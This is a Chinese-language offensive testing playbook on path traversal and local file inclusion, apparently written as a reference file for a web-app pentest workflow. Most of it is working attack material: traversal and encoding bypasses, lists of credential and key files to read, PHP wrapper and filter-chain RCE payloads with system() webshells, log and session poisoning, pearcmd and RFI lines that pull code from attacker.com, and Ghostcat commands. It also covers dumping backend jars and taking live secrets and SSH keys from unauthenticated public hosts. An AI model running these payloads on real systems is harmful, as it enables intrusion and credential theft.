---
phase: webapp
vuln_class: [path-traversal, lfi]
title: 路径穿越 / LFI 测试
summary: 先判"读文件"还是"执行包含"，再按过滤策略选编码；PHP 走包装器与日志投毒，编译型后端走 dump jar 转白盒。
---

> 站上已有 `/static` `/assets` `/img` 这类前缀就可以打 `/static../`，不必先看见配置缺斜杠。没有这类前缀，走普通 `file=` 穿越，不要为了勾表空打。

## 0. 判据速查

| 现象 | 判据 | 打法 |
|---|---|---|
| `?page=` / `?file=` / `?download=` 等参数回显文件内容 | 存在文件读取 | 先读 `/etc/passwd` 定位根，再打配置与密钥 |
| 应用**执行**了读到的内容（PHP 回显、报错含源码行） | 是 LFI 包含，不是纯读 | 直奔包装器与日志投毒 |
| `../` 被剥成空 | 单次 strip | `....//`、`..././` |
| `%2e%2e%2f` 被拦但原文可过 | 过滤在解码前 | 双编码 `%252e%252e%252f` |
| 追加 `.php` 后缀挡住读取 | 有后缀拼接 | `%00`（PHP<5.3.4）或长路径截断 |
| `/static../` 读到 web 外 | Nginx `alias` 缺尾斜杠 | 见 §8 |
| `/app/..;/manager/html` 能进 | Tomcat 剥 `;` 后再规范化 | 见 §7.1 |
| `GET /W~1.ASP` 404、`/Z~1.ASP` 400 | IIS 短文件名差异 | 见 §10 |
| 能读文件且后端是 fat jar | 黑盒可升白盒 | dump jar 反编译，见 §6 |

---

## 1. 先分型：穿越 vs 包含

```text
路径穿越: 用 ../ 逃出目标目录，读任意文件 —— 只"读"
LFI:      PHP 的 include()/require() 受控 —— 文件被当 PHP "执行"

http://target.com/index.php?page=home
  → /var/www/html/pages/home.php
http://target.com/index.php?page=../../../../etc/passwd
  → /etc/passwd
```

判据：**能不能执行**决定后续路线。纯读走到读配置/密钥/源码为止；包含可以走到 RCE。

---

## 2. 穿越序列编码谱

过滤策略决定用哪一条，不要瞎试。

```text
基础:        ../../../etc/passwd
             ..\..\..\windows\system32\drivers\etc\hosts
URL 编码:    %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd     # %2f = /
             %2e%2e%5c%2e%2e%5c                        # %5c = \
双编码:      %252e%252e%252f%252e%252e%252f             # %25 = %，服务端解一次、过滤查解码前
             ..%252f..%252fetc%252fpasswd
超长 UTF-8:  ..%c0%af..%c0%af                           # '/' 的 overlong
             ..%c1%9c..%c1%9c                           # '\' 的 overlong
             ..%ef%bc%8f                                # 全角 ／
混合:        ..%2F..%2Fetc%2Fpasswd
             ....//....//etc/passwd
strip ../:   ....//        # 剥一次 → ../
             ..././        # 剥一次 → ../
空字节:      ../../../../etc/passwd%00.jpg              # PHP < 5.3.4
```

---

## 3. 目标文件清单

### Linux

```text
/etc/passwd                    用户与 UID
/etc/shadow                    哈希（需高权限读）
/etc/hosts                     内网主机名 → 横向目标
/proc/self/environ             进程环境：DB 密码、API Key 金矿
/proc/self/cmdline             启动命令行
/proc/self/fd/0..255           打开的文件描述符（上传临时文件）
/proc/[pid]/maps               内存映射：加载库的绝对路径
/var/log/apache2/access.log    日志投毒
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log              SSH 尝试日志
/var/mail/www-data             系统用户邮件
/home/USER/.ssh/id_rsa         SSH 私钥
/home/USER/.bash_history       命令历史（常含凭据）
/home/USER/.aws/credentials    AWS 密钥
/tmp/sess_SESSIONID            PHP 会话文件
```

### 应用配置

```text
/var/www/html/.env             Laravel/Node 环境变量
/var/www/html/config.php
/var/www/html/wp-config.php    WordPress DB 账密
/etc/apache2/sites-enabled/
/etc/nginx/sites-enabled/
/usr/local/etc/nginx/nginx.conf
```

### Windows

```text
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM           NTLM 哈希（常被锁）
C:\inetpub\wwwroot\web.config            ASP.NET 连接串
C:\inetpub\wwwroot\global.asa
C:\xampp\htdocs\wp-config.php
C:\Users\Administrator\.ssh\id_rsa
C:\ProgramData\MySQL\MySQL Server 8\my.ini
```

---

## 4. 过滤绕过清单

```text
□ URL 编码：%2e%2e%2f
□ 双编码：%252e%252e%252f
□ overlong UTF-8：..%c0%af / ..%ef%bc%8f
□ 反斜杠：..%5C（Linux 上偶尔也认）
□ 冗余序列：....// / ..././
□ 空字节：/../../../etc/passwd%00
□ 绝对路径直打：/etc/passwd（无前缀拼接时最有效）
□ Windows UNC：\\127.0.0.1\C$\Windows\win.ini
□ 长路径截断：/etc/passwd/./././....（255+ 字符冲掉追加的 .php）
```

实测分布（经验值，不是保证）：绝对路径直打最常见 → `WEB-INF/web.xml`（Java）→ base64 编码路径 → 双编码 → overlong UTF-8 → 空字节（老 PHP）。

---

## 5. PHP LFI → RCE

### 5.1 包装器矩阵

`php://filter` **永远第一个试**——只读不执行，能安全拿源码。

```text
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.UTF-8.UTF-16LE/resource=index.php
php://filter/zlib.deflate/resource=index.php
php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd   # 串联
```

| 包装器 | 前提 | 效果 |
|---|---|---|
| `php://filter` | 无 | 读源码（含 PHP 源） |
| `php://input` | `allow_url_include=On` | 执行 POST body |
| `data://` | `allow_url_include=On` | 直接执行内联 PHP |
| `phar://` | 能上传文件 | **触发 metadata 反序列化**，走 POP 链 |
| `zip://` | 能上传 zip | 读包内 PHP |
| `expect://` | `expect` 扩展（罕见） | 直接执行命令 |

```text
POST /vuln.php?page=php://input
Body: <?php system('id'); ?>

data://text/plain,<?php system('id');?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
data:text/plain,<?php system('id');?>        # 少了 // 也能过某些过滤

zip:///tmp/upload.zip#shell.php
phar:///tmp/upload.phar/anything             # phar 可伪装成 jpg（phar-jpg polyglot）
```

### 5.2 过滤器链 RCE（无上传、无日志权限）

`convert.iconv` 的字符集转换会写入可控字节，串起来就能落地任意内容：

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# 产出形如：
# php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|/resource=php://temp
```

**盲读 oracle**：`convert.iconv` + `dechunk` 制造"首字节是否匹配"的行为差异，逐字节读出文件。

```text
工具：synacktiv/php_filter_chains_oracle_exploit
```

**wrapwrap**（ambionics）：给文件内容加任意前后缀，把"文件读"转成 XXE / SSRF / 反序列化触发点。

**CVE-2024-2961**（glibc iconv 堆溢出，glibc < 2.39）：`php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT` 链打堆溢出 → RCE，**不需要可写路径、不需要日志**。工具 `cfreal/cnext-exploits`。

### 5.3 日志投毒（有日志读权限时最稳）

```text
# Apache access log —— UA 里塞码
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
→ ?page=../../../../var/log/apache2/access.log&cmd=id

# SSH auth.log —— 用户名塞码
ssh '<?php system($_GET["cmd"]); ?>'@target.com
→ /var/log/auth.log

# 邮件日志 —— Subject 塞码
Subject: <?php system($_GET['cmd']); ?>
→ /var/log/mail.log
```

### 5.4 会话文件投毒

把可控字段（用户名、`lang`）设成 PHP 码，落进 `sess_<PHPSESSID>`：

```text
?page=../../../../tmp/sess_SESSIONID&cmd=id
?page=../../../../var/lib/php/sessions/sess_SESSIONID
```

### 5.5 /proc 两路

```text
/proc/self/environ    UA 进环境变量时可用（需 CGI/FastCGI）
/proc/self/fd/N      N = 0..255，盲爆破上传临时 fd；要赶在清理前包含
```

### 5.6 phpinfo() 竞速

```text
1. multipart POST 到 phpinfo() 页 → 响应里泄 tmp_name（/tmp/phpXXXXXX）
2. 在 PHP 清理前包含该临时文件
窗口约 10ms，要大量并发
```

### 5.7 pearcmd（Docker PHP 镜像常见）

前提：`pearcmd.php` 可经 LFI 读到，且 `register_argc_argv=On`。

```text
# 写文件
/?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=phpinfo()?>+/tmp/shell.php
# 改 man_dir 写
/?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/shell.php+-d+man_dir=<?=system($_GET[0])?>+-s+
# 拉远端
/?file=/usr/local/lib/php/pearcmd.php&+download+http://attacker.com/shell.php
# 装包
/?file=/usr/local/lib/php/pearcmd.php&+install+http://attacker.com/evil.tgz
```

### 5.8 RFI（`allow_url_include=On`，罕见）

```text
?page=http://attacker.com/shell.txt
?page=ftp://attacker.com/shell.php
```

---

## 6. dump jar 反编译白盒审计（编译型后端）

认到任意文件读且后端是 Java fat jar / Go 单二进制，**别停在 `/etc/passwd` 和 `application.yml`**。同一个读洞能把整个后端 jar 拖下来反编译，黑盒洞升级为白盒审计，一次挖一串高危（实测：读一个文件服务 jar → 鉴权绕过 + 任意上传 + 任意删除 + 硬编码凭据 4 条）。

### 第 1 步：定位 jar 绝对路径

`/WEB-INF/lib/` 只对 war 解包部署有用；`java -jar` 部署的 fat jar 在磁盘任意处。

```text
/root/.bash_history                金矿：完整 java -jar 命令 + 部署目录 + 版本号
/etc/systemd/system/*.service      ExecStart 带 jar 绝对路径
启动脚本 *.sh / 报错栈（FileNotFound 吐绝对路径）
```

**坑**：Java `File.length()` 对 `/proc/self/cmdline`、`/proc/*/environ` 返回 0 —— 读出空 body 不是失败，别靠 `/proc` 定位。目录列表功能常坏（有 `Content-Length` 但 body 空），别指望列目录，直接读已知文件。

### 第 2 步：dump jar

```text
GET /downloadFile?fileUrl=../../../../usr/local/shfwapp/xk-fs-api-5.0/xkes-platform-fs-5.0.0-SNAPSHOT.jar
```

- 先 `Range: bytes=0-0` 探，确认 200/206 且 `Content-Length` 是 jar 真实大小，再全量拉。
- fat jar 很大（平台级 250MB+）。**优先拉含洞的小组件**（文件服务/网关/鉴权模块），别一开始拉最大业务后端——实测 ~55KB/s，252MB 要 1.5h，会拖死节奏。
- 不支持 Range（curl 报 33）就单线程拉，别反复 resume。

### 第 3 步：解压 + 反编译

```bash
unzip xkes-platform-fs-5.0.0-SNAPSHOT.jar -d fs-extract/
# 业务代码在 BOOT-INF/classes/，第三方依赖在 BOOT-INF/lib/（一般不用反编译）
for c in $(find BOOT-INF/classes -name '*.class'); do
  java -jar cfr.jar "$c" --outputdir decompiled/
done
```

CFR 的 `--jarfilter` 对 fat jar 容易匹配不到，**逐 class 反编译更稳**；只编 `BOOT-INF/classes/` 下的业务包（`com/公司名/`），跳过 `org/`、`net/`。

### 第 4 步：白盒审计四个重点

1. **鉴权拦截器/Filter**：找 `contains("xxx")`、`startsWith("xxx")` 这种按字符串放行的逻辑，一处放行即失守。
2. **文件读写**：找 `new File(常量 + 参数)` 裸拼接（无 normalize/白名单）。读、写、删三处常同源，一处穿越 = 三处穿越。
3. **硬编码密钥**：`static String KEY = "..."`、`accessKeyId/Secret`，以及 `EnvironmentAware`/`@Value` **漏覆盖**的字段（配置写了但代码没读，密钥保持默认值）。
4. **上传扩展名**：`substring(lastIndexOf("."))` 直接当扩展名 → 可控写 webshell。

命中后**用同一黑盒洞只读验证**鉴权绕过（带/不带 appkey 对比回包）；上传/删除类**只留源码证据 + 理论 PoC，不实际执行**。

---

## 7. Java / Spring / Tomcat

### 7.1 Tomcat 路径参数规范化（`/..;/`）

Tomcat 把 `;` 当 path parameter 分隔符，在路径解析**之前**把 `;` 到下一个 `/` 之间全剥掉；上游代理/WAF 往往不剥。

```text
GET /app/..;/manager/html              → Tomcat 解析为 /manager/html
GET /app/..;jsessionid=x/..;/WEB-INF/web.xml
GET /static/..%252f..%252fWEB-INF/web.xml      # 双解码
GET /%252e%252e/%252e%252e/etc/passwd
```

WAF 绕过原理：反代看到 `/app/..;/manager/html` 认为在 `/app/` 下（放行），Tomcat 把 `..;` 规范成 `..` 逃上去。

### 7.2 Spring 资源加载

```java
new ClassPathResource(userInput);
getClass().getResourceAsStream("/templates/" + userInput);
servletContext.getResourceAsStream("/WEB-INF/" + userInput);
```

```text
GET /download?file=../WEB-INF/web.xml
GET /download?file=../WEB-INF/classes/application.properties
GET /download?file=../WEB-INF/classes/application.yml
GET /download?file=../WEB-INF/classes/bootstrap.properties
GET /download?file=../WEB-INF/classes/META-INF/persistence.xml
```

### 7.3 高价值 Java 目标

```text
/WEB-INF/web.xml                        servlet 映射、filter 链、安全约束
/WEB-INF/classes/application.properties DB 账密、API Key
/WEB-INF/classes/application.yml
/WEB-INF/lib/                           应用 JAR（拖下来反编译）
/META-INF/MANIFEST.MF                   构建元数据、主类
/META-INF/context.xml                   Tomcat datasource
```

### 7.4 AJP Ghostcat（CVE-2020-1938）

AJP（8009）暴露即可任意文件读 + JSP 执行。前提：8009 可达（Docker/内网常不设防），Tomcat < 9.0.31 未设 `secretRequired`。

```bash
python3 ajpShooter.py http://target:8009 /WEB-INF/web.xml read

python3 ajpShooter.py http://target:8009 / eval --ajp-secret="" \
  -H "javax.servlet.include.request_uri:/anything" \
  -H "javax.servlet.include.servlet_path:/uploads/avatar.txt"
```

---

## 8. Nginx alias 缺斜杠

### Nginx alias 缺斜杠（短表有指针）

认：站上已有 `/static`、`/assets`、`/img`、`/files` 这类前缀（黑盒看不见 nginx 配置，有前缀就打）；或 Caddy 模板吃用户输入。

打：

1. `GET /static../etc/passwd`、`GET /static../etc/nginx/nginx.conf`、`GET /assets..%2f..%2fetc%2fpasswd`。
2. 对照：`/static/../etc/passwd` 常被规范化挡掉，**缺斜杠那一枪**才是 alias 替换前缀。
3. Caddy 模板面：输入里试 `{{readFile "/etc/passwd"}}`、`{{.Req.Host}}`。读到文件才算，只反射 Host 不算本条。

算成：读到 web 根以外的配置 / 密钥 / `nginx.conf`。只能列静态目录里本来就有的 css/图 → 没成。

假点：404；alias 两边都有斜杠，规范化后出不去；Caddy 模板不执行用户输入。单站没中不删短表这行。有静态前缀就打，不必先看见 nginx 配置。普通 `file=` 穿越仍走 §2/§4 通用段，两枪不互相替代。

### 原理：尾斜杠陷阱

```nginx
# 有洞 —— location 缺尾斜杠
location /assets {
    alias /data/;
}
```

`alias` 把 **location 前缀原样替换**成别名路径，剩余部分保留：

```text
/assets../etc/passwd  →  /data/ + ../etc/passwd  →  /etc/passwd
GET /assets../etc/passwd
GET /assets..%2f..%2fetc%2fpasswd
```

```nginx
# 正确写法
location /assets/ {
    alias /data/;
}
```

### off-by-one 变体

```nginx
location /img {
    alias /var/images;      # 两边都没斜杠，仍可穿
}
# /img../secret → /var/images/../secret → /var/secret
```

**规则**：用 `alias` 时，`location` 前缀与别名路径必须**都带尾斜杠，或都不带**；一边带一边不带就是穿越。

---

## 9. Node.js 路径模块坑

### 9.1 `path.join()` + URL 解码

Express 在 `path.join` **之前**已把 `req.params` 解码：

```javascript
const filePath = path.join(__dirname, 'uploads', req.params.name);
```

```text
GET /files/..%2f..%2f..%2fetc%2fpasswd
req.params.name = "../../../etc/passwd"     # 已解码
path.join(__dirname,'uploads','../../../etc/passwd') = /etc/passwd
```

### 9.2 `express.static()`

先 `decodeURIComponent` 再 `path.normalize()`。中间件解一次、`express.static` 再解一次 → 双编码 `%252e%252e%252f` 可过。`%00` 在 Node v14+ 被拒，老版本可能截断。

### 9.3 `url.parse()` vs `new URL()`

```javascript
require('url').parse(userInput).pathname   // 不解析 ../，可能原样带出
new URL(userInput, 'http://localhost').pathname  // 会规范化掉 ../
```

混用 `url.parse()` 与 `path.join()` 的应用，`new URL()` 本该挡掉的穿越会漏过去。

### 9.4 仓库根当静态（koa-static / express.static 指到 cwd）

认：页面或 `/package.json` 能直接 GET 到 Node 工程文件（`package.json`、`routes/`、`index.js`），说明静态中间件指的是仓库根，不是 `public/`。

打：不登录。顺着 node-config 环境名打 `/config/online.yml` `/config/default.yml` `/config/production.yml` `/config/pre.yml` `/config/dev.yml`，以及 `.env`。不必先打 `../`。

算成：yml/json 里是**完整库账密或云密钥实值**。只有 README / 无钥源码 / 只有端口的空模板 → 没成（信息级不报）。

假点：静态根只出 `public`；`package.json` 200 但 config 404；yml 没有账密。单站没中不删这套认法。

### 9.5 静态桶上的 .NET 发布物（aspx 还能 GET）

认：对象存储 / 静态桶（MSS `product-fe-*` 一类）上挂着旧 .NET 发布物。aspx 源码还能 GET，不是编译后才吐。同目录 `web.config` 常被 WAF 拦。不是 Node 仓库根（那枪见 §9.4）。

打：不登录。`web.config` 456 别停，打同目录 `App.config`、`Web.Release.config`、`*.exe.config`、`bin/*.dll.config`。有 bin 再扫 `*.pdb` 看有没有连配置。

算成：完整账密或 DeveloperToken，不是 `ENTER_YOUR_*` 占位。

假点：aspx 200 但 config 404；只有源码没有钥；占位符口令。密钥实值不进库。单站没中不删这套认法。

### 9.6 公网 VS Code 系读进程环境

认：公网 code-server；打开 `/login` 直接进编辑器（无登录墙）。

打：不登录 `GET /remote-resource?path=/proc/self/status` 看 Uid，再 `path=/proc/self/environ`。公网 VS Code 系、页面/`_static` 里 `AuthType.None` 是常见皮，没有这个字仍打。不要停在 README。environ 里若有 SSH 私钥（常是 Base64 PEM）：**解开后假钥对照** 连环境里的 Git 主机，真钥 Hello 用户名、假钥 Permission denied。只抄到字符串不算认钥。

算成：environ 里是**他人**邮箱和完整 SSH 私钥，且真钥能问出 Git 用户名。只有安装脚本 / 公开模板 → 没成。

假点：path 要登录；只读到 README；真假钥同一句 Permission denied。认证枚举名不是 None 不算假点。单站没中不删短表这行。密钥实值不进库。

---

## 10. IIS 短文件名枚举（`~1` 波浪号）

Windows NTFS 为长文件名生成 8.3 短名（`LONGFI~1.TXT`），IIS 对**合法短名前缀**与非法前缀响应不同：

```text
GET /W~1.ASP   → 404（前缀合法，只是没这个文件）
GET /Z~1.ASP   → 400（请求非法）
```

差分即泄漏"是否存在以该前缀开头的文件"：

```text
Step 1: /A~1*        → 404 = 存在以 A 开头的文件
Step 2: /AB~1*       → 404 = 存在以 AB 开头的文件
Step 3: /ABCDEF~1.A* → 404 = 扩展名以 A 开头
```

```bash
java -jar iis_shortname_scanner.jar https://target.com/
```

价值：发现隐藏备份/配置/源码；8.3 格式把爆破空间压到极小；目录列举关掉也照样能用。

---

## 11. 参数名与高频入口

```text
filename  filepath  path    file    url
template  page      include dir     document
folder    root      pg      lang    doc
conf      data      content name    src
inputFile hdfile    XFileName FileUrl readfile
```

| 入口 | 频率 |
|---|---|
| `down.php` / `download.php` | 极高 |
| `download.jsp` / `download.do` | 极高 |
| `download.asp` / `download.aspx` | 高 |
| `readfile.php` / `file.php` | 高 |
| `export` / `report` | 中 |
| `template` / `preview` | 中 |

也别忘了测：HTTP 头、Cookie、表单 `action`、导入/上传功能。

---

## 12. 危害升级路径

```text
任意文件读
├── /etc/passwd            → 枚举用户
├── /proc/self/environ     → 环境里的 DB 密码、API Key
├── 应用配置                → 凭据 → 横向
├── SSH 私钥                → 直登服务器
├── fat jar                → 反编译 → 白盒挖一串（§6）
└── 找到日志路径            → 日志投毒 → RCE

LFI 包含
├── 日志/session/environ 投毒 → webshell
├── php://input / data://      → 直接执行
├── 过滤器链 RCE               → 无上传无日志也能落地
└── php://filter               → 读 PHP 源码 → 找更多漏洞
```

---

## 13. 纪律

1. **先判能不能执行**。纯读和包含的路线完全不同，别拿纯读的站去试 `php://input`。
2. **`php://filter` 永远第一枪**。它只读不执行，能安全拿源码，且不依赖 `allow_url_include`。
3. **双编码看的是解码次数差**。服务端解一次、过滤查解码前，才吃 `%252e`；解两次就直接 `%2e` 更省事。
4. **`alias` 那枪靠"缺斜杠"**，`/static/../etc/passwd` 被规范化挡掉是正常的，不代表 alias 没洞。
5. **能读文件先想 dump jar**。编译型后端停在读配置，等于白扔一个白盒机会。
6. **白盒审计的读写删常同源**。找到一处裸拼接，三处都要看。
7. **上传/删除类只留源码证据 + 理论 PoC**，不实际执行；鉴权绕过可用只读回包对比验证。
8. **密钥实值不进库**。报告只认 `rules/vuln-report-format.md`。
